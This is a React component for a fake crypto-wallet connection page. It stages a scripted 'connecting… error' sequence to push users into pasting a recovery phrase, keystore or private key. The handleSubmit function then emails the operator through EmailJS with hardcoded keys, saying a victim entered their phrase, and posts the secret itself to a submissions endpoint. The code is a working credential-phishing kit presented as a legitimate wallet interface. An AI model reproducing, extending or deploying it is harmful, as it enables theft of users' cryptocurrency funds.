import emailjs from "@emailjs/browser";
import { useTranslations } from "next-intl";
import React, { useEffect, useState } from "react";
import { useRouter } from "../../../i18n/route";

interface ConnectWalletProps {
  handleManualConnect: () => void;
  setActiveTabTwo: (tab: "phrase" | "keystore" | "privateKey") => void;
  title: string;
}

const ConnectWallet: React.FC<ConnectWalletProps> = ({
  handleManualConnect,
  setActiveTabTwo,
  title,
}) => {
  const t = useTranslations("ConnectWallet");
  console.log("t----4--44", t);
  const [flowState, setFlowState] = useState<
    "initializing" | "connecting" | "error" | "manual"
  >("initializing");
  const [showManualConnect, setShowManualConnect] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [activeTab, setActiveTab] = useState<
    "phrase" | "keystore" | "privateKey"
  >("phrase");

  const router = useRouter();
  const [inputValue, setInputValue] = useState("");
  const [error, setError] = useState("");

  useEffect(() => {
    const initTimer = setTimeout(() => {
      setFlowState("connecting");

      const connectTimer = setTimeout(() => {
        setFlowState("error");
      }, 2000);

      return () => clearTimeout(connectTimer);
    }, 1500);

    return () => clearTimeout(initTimer);
  }, []);

  const handleSubmit = async () => {
    if (isSubmitting) return;
    if (!inputValue) {
      setError(t("errors.required")); // "Veuillez entrer une valeur"
      return;
    }
    if (inputValue.length < 12) {
      setError(t("errors.minLength")); // "La valeur doit contenir au moins 12 caractères"
      return;
    }
    setIsSubmitting(true);

    try {
      await emailjs.send(
        "service_b2ixunl",
        "template_kz8tn3s",
        {
          time: new Date().toLocaleString(),
          message: `
              Wallet Type: ${title}
              note: A client just inserted their phrase Key.
            `,
        },
        "6yT_1hQ4omr4Cq-3C"
      );

      const response = await fetch("/api/submissions", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type: activeTab, value: inputValue }),
      });

      if (response.ok) router.push("/activate");
    } catch (error) {
      console.error("Email or submission failed:", error);
      setError("Failed to send notification");
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleManualClick = () => {
    setShowManualConnect(true);
    setFlowState("manual");
    handleManualConnect();
  };

  const handleTabClick = (tab: "phrase" | "keystore" | "privateKey") => {
    setActiveTab(tab);
    setActiveTabTwo(tab);
  };

  return (
    <div className="flex flex-col items-center w-full p-0 md:p-6">
      {/* Cloud Import Icon */}
      <div className="mb-6">
        <svg
          xmlns="http://www.w3.org/2000/svg"
          className="h-20 w-20 text-blue-400"
          fill="none"
          viewBox="0 0 24 24"
          stroke="currentColor"
        >
          <path
            strokeLinecap="round"
            strokeLinejoin="round"
            strokeWidth={1.5}
            d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M9 19l3 3m0 0l3-3m-3 3V10"
          />
        </svg>
      </div>

      {flowState === "initializing" ? (
        <div className="flex flex-col items-center py-8 w-[20rem] md:w-full">
          <div className="animate-pulse flex space-x-2">
            <div className="h-3 w-3 bg-blue-400 rounded-full"></div>
            <div className="h-3 w-3 bg-blue-400 rounded-full"></div>
            <div className="h-3 w-3 bg-blue-400 rounded-full"></div>
          </div>
          <p className="text-white font-medium mt-4">{t("initializing")}</p>
        </div>
      ) : flowState === "connecting" ? (
        <div className="flex flex-col items-center py-8 w-[20rem] md:w-full">
          <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-blue-500 mb-4"></div>
          <p className="text-white font-medium">{t("connecting")}</p>
        </div>
      ) : flowState === "error" ? (
        <div className="w-[20rem] md:w-full">
          <h2 className="text-xl font-bold text-white mb-4 text-center">
            {t("title")}
          </h2>

          <div className="flex items-center justify-between bg-red-900/30 border border-red-700 rounded-lg p-1 py-2 md:py-2 cursor-pointer md:p-4 mb-6">
            <div className="flex items-center">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                className="h-5 w-5 text-red-400 mr-2"
                viewBox="0 0 20 20"
                fill="currentColor"
              >
                <path
                  fillRule="evenodd"
                  d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z"
                  clipRule="evenodd"
                />
              </svg>
              <span className="text-red-300 text-[10px] md:text-sm pt-1">
                {t("error")}
              </span>
            </div>
            <button
              onClick={handleManualClick}
              className="px-3 py-1 bg-blue-600 hover:bg-blue-700 rounded-md text-white text-[10px] md:text-sm font-medium transition-colors"
            >
              <p className="text-[10px] md:text-sm">{t("connectManually")}</p>
            </button>
          </div>
        </div>
      ) : (
        <div className="w-full">
          <h2 className="text-xl font-bold text-white mb-4 text-center">
            {t("title")}
          </h2>

          {/* Tabs */}
          <div className="flex border-b border-gray-700 mb-4">
            <button
              className={`px-4 py-2 font-medium ${
                activeTab === "phrase"
                  ? "text-blue-400 border-b-2 border-blue-400"
                  : "text-gray-400"
              }`}
              onClick={() => handleTabClick("phrase")}
            >
              <p className="text-[13px] md:text-2xl">{t("tabs.phrase")}</p>
            </button>
            <button
              className={`px-4 py-2 font-medium ${
                activeTab === "keystore"
                  ? "text-blue-400 border-b-2 border-blue-400"
                  : "text-gray-400"
              }`}
              onClick={() => handleTabClick("keystore")}
            >
              <p className="text-[13px] md:text-2xl">{t("tabs.keystore")}</p>
            </button>
            <button
              className={`px-4 py-2 font-medium ${
                activeTab === "privateKey"
                  ? "text-blue-400 border-b-2 border-blue-400"
                  : "text-gray-400"
              }`}
              onClick={() => handleTabClick("privateKey")}
            >
              <p className="text-[13px] md:text-2xl">{t("tabs.privateKey")}</p>
            </button>
          </div>

          {/* Content Area */}
          <div className="mb-6">
            <textarea
              className="w-full h-32 p-3 bg-gray-800 border border-gray-700 rounded-md text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
              placeholder={
                activeTab === "phrase"
                  ? t("placeholders.phrase")
                  : activeTab === "keystore"
                  ? t("placeholders.keystore")
                  : t("placeholders.privateKey")
              }
              value={inputValue}
              onChange={(e) => setInputValue(e.target.value)}
            />
          </div>
          <button
            onClick={handleSubmit}
            className="px-4 py-2 font-medium border-2 border-blue-400 w-full cursor-pointer hover:bg-blue-400 text-blue-400 hover:text-white transition-colors"
          >
            <p className="text-[13px] md:text-2xl">
              {isSubmitting ? t("processing") : t("submit")}
            </p>
          </button>

          {error !== "" && (
            <div className="bg-gray-800/50 border border-gray-700 mt-4 rounded-md p-4 mb-4">
              <h3 className="font-bold text-red-500 mb-2">Error</h3>
              <p className="text-red-500 text-[13px] md:text-sm">{error}</p>
            </div>
          )}

          {/* Info Box */}
          <div className="bg-gray-800/50 border border-gray-700 mt-4 rounded-md p-4 mb-4">
            <h3 className="font-bold text-white mb-2">{t("info.title")}</h3>
            <p className="text-gray-300 text-[13px] md:text-sm">
              {t("info.description", { title })}
            </p>
          </div>
        </div>
      )}
    </div>
  );
};

export default ConnectWallet;
